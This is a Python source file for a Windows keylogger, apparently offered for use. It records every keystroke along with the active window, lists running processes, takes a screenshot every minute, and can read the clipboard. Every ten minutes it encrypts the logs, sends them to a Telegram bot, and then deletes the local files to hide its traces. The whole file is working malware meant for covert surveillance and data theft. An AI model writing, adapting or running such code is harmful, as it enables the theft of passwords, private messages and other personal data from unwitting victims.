import os
import json
import logging
import base64
import shutil
import subprocess
import time
import requests
import win32clipboard
import win32gui
import win32process
import pyautogui
import psutil
from pynput import keyboard
from Crypto.Cipher import AES
from datetime import datetime
from threading import Thread
import mss  # Screenshot capturing

# 🔹 Telegram Configuration
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"

# 🔹 Keylogger Configuration
LOG_FILE = "logs.json"
SCREENSHOT_DIR = "screenshots"
SECRET_KEY = b"16CHARSECRETKEY"  # Change this, must be 16, 24, or 32 bytes

if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

class AdvancedKeylogger:
    def __init__(self):
        self.log = []
        self.current_window = self.get_active_window()
        self.process_list = self.get_running_processes()

        # Ensure logs exist
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, "w") as f:
                json.dump([], f)

        # Start logging threads
        Thread(target=self.listen_keyboard, daemon=True).start()
        Thread(target=self.screenshot_capture, daemon=True).start()

    def get_active_window(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process_name = psutil.Process(pid).name()
            return process_name
        except:
            return "Unknown"

    def get_running_processes(self):
        return [p.info["name"] for p in psutil.process_iter(attrs=["name"])]

    def log_key(self, key):
        key = str(key).replace("'", "")
        if key == "Key.space":
            key = "[SPACE]"
        elif key == "Key.enter":
            key = "[ENTER]"
        elif key == "Key.backspace":
            key = "[BACKSPACE]"
        
        log_entry = {
            "time": str(datetime.now()),
            "window": self.get_active_window(),
            "key": key
        }
        self.log.append(log_entry)
        self.save_log()
    
    def save_log(self):
        with open(LOG_FILE, "r+") as f:
            data = json.load(f)
            data.append(self.log[-1])
            f.seek(0)
            json.dump(data, f, indent=4)

    def listen_keyboard(self):
        with keyboard.Listener(on_press=self.log_key) as listener:
            listener.join()

    def capture_clipboard(self):
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData()
        except:
            data = "[UNREADABLE]"
        win32clipboard.CloseClipboard()
        return data

    def screenshot_capture(self):
        while True:
            time.sleep(60)  # Capture every 60 seconds
            with mss.mss() as sct:
                filename = os.path.join(SCREENSHOT_DIR, f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png")
                sct.shot(output=filename)

    def encrypt_logs(self, data):
        cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(data).encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

    def send_to_telegram(self):
        with open(LOG_FILE, "r") as f:
            logs = json.load(f)
            encrypted_data = self.encrypt_logs(logs)
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          data={"chat_id": CHAT_ID, "text": encrypted_data})

    def self_destruct(self):
        os.remove(LOG_FILE)
        shutil.rmtree(SCREENSHOT_DIR, ignore_errors=True)

# Run the keylogger
if __name__ == "__main__":
    keylogger = AdvancedKeylogger()
    while True:
        time.sleep(600)  # Every 10 mins, send logs & delete traces
        keylogger.send_to_telegram()
        keylogger.self_destruct()
